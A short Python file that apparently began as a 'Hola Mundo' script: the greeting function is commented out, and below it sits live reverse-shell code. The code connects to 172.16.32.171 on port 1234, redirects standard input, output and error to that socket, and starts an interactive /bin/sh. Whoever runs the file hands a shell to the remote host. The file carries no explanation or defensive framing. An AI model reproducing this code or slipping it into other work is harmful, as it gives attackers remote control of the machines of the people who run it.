import subprocess
import socket
import os

#def run():
#    print("Hola Mundo")
#if __name__ == "__main__":
#    run()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.16.32.171",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
